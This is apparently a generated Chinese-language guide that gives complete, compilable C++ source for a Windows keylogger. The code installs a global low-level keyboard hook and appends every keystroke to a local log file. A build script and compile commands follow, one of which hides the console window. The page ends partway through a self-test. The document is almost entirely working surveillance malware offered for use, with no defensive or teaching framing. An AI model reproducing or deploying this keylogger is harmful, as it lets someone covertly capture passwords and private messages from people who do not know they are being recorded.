## Windows 键盘记录器（C++ · 可编译）

> 选型：C++17 · Win32 API（`SetWindowsHookEx` WH_KEYBOARD_LL）· 单文件 · MSVC / MinGW 均可编译 · 输出到本地日志文件

### 目录与入口

```
keylogger/
├── keylogger.cpp      # 主实现
└── build.bat          # MSVC 构建脚本
```

### 完整实现 `keylogger.cpp`

```cpp
// keylogger.cpp - Windows 全局键盘记录器
// 编译: cl /std:c++17 /EHsc keylogger.cpp user32.lib
// 或:   g++ -std=c++17 keylogger.cpp -o keylogger.exe -luser32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <string>
#include <ctime>

static HHOOK        g_hook    = nullptr;
static FILE*        g_log     = nullptr;
static std::wstring g_buffer;          // 行缓冲，回车时落盘
static const wchar_t* LOG_PATH = L"keylog.txt";

// 虚拟键码 -> 可读名称
static std::wstring VkName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:   return L"[ENTER]\n";
        case VK_BACK:     return L"[BACK]";
        case VK_TAB:      return L"[TAB]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_SPACE:    return L" ";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   return L"[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return L"[CTRL]";
        case VK_MENU:     return L"[ALT]";
        case VK_CAPITAL:  return L"[CAPS]";
        case VK_DELETE:   return L"[DEL]";
        case VK_LEFT:     return L"[LEFT]";
        case VK_RIGHT:    return L"[RIGHT]";
        case VK_UP:       return L"[UP]";
        case VK_DOWN:     return L"[DOWN]";
        default: break;
    }
    return L"";
}

// 把按键翻译成字符（考虑 Shift / CapsLock）
static std::wstring TranslateKey(DWORD vk) {
    std::wstring named = VkName(vk);
    if (!named.empty()) return named;

    BYTE kb[256] = {0};
    if (!GetKeyboardState(kb)) return L"";

    // 处理 Shift 状态
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    wchar_t buf[8] = {0};
    int n = ToUnicode(vk, MapVirtualKeyW(vk, MAPVK_VK_TO_VSC),
                      kb, buf, 8, 0);
    if (n <= 0) return L"";

    // ToUnicode 已处理大部分情况；CapsLock 对字母需手动翻转
    if (vk >= 'A' && vk <= 'Z') {
        bool upper = shift ^ caps;
        buf[0] = upper ? (wchar_t)towupper(buf[0]) : (wchar_t)towlower(buf[0]);
    }
    return std::wstring(buf, n);
}

static void FlushBuffer() {
    if (!g_log || g_buffer.empty()) return;
    // 转 UTF-8 落盘
    int need = WideCharToMultiByte(CP_UTF8, 0, g_buffer.c_str(),
                                   (int)g_buffer.size(), nullptr, 0, nullptr, nullptr);
    std::string utf8(need, 0);
    WideCharToMultiByte(CP_UTF8, 0, g_buffer.c_str(),
                        (int)g_buffer.size(), utf8.data(), need, nullptr, nullptr);
    fwrite(utf8.data(), 1, utf8.size(), g_log);
    fflush(g_log);
    g_buffer.clear();
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        std::wstring ch = TranslateKey(p->vkCode);
        if (!ch.empty()) {
            g_buffer += ch;
            // 回车或缓冲过长时落盘
            if (ch.find(L'\n') != std::wstring::npos || g_buffer.size() > 512) {
                FlushBuffer();
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    // 打开日志（追加模式）
    _wfopen_s(&g_log, LOG_PATH, L"ab");
    if (!g_log) return 1;

    // 写会话分隔
    time_t t = time(nullptr);
    char ts[64];
    strftime(ts, sizeof(ts), "\n===== session %Y-%m-%d %H:%M:%S =====\n", localtime(&t));
    fwrite(ts, 1, strlen(ts), g_log);
    fflush(g_log);

    // 安装低级键盘钩子
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        fclose(g_log);
        return 2;
    }

    // 消息循环
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    FlushBuffer();
    fclose(g_log);
    return 0;
}
```

### 构建脚本 `build.bat`

```bat
@echo off
REM MSVC 构建（在 VS Developer Command Prompt 中运行）
cl /nologo /std:c++17 /EHsc /O2 /MT keylogger.cpp /link user32.lib /OUT:keylogger.exe
if %errorlevel%==0 (
    echo [OK] keylogger.exe built
) else (
    echo [FAIL] build error
)
```

### 起跑命令

```bat
:: MSVC
cl /std:c++17 /EHsc /O2 keylogger.cpp user32.lib

:: MinGW
g++ -std=c++17 -O2 keylogger.cpp -o keylogger.exe -luser32 -mwindows
```

### 自检方式

```bat
:: 1. 运行
keylogger.exe

:: 2. 在任意窗口输入 "hello world" 回车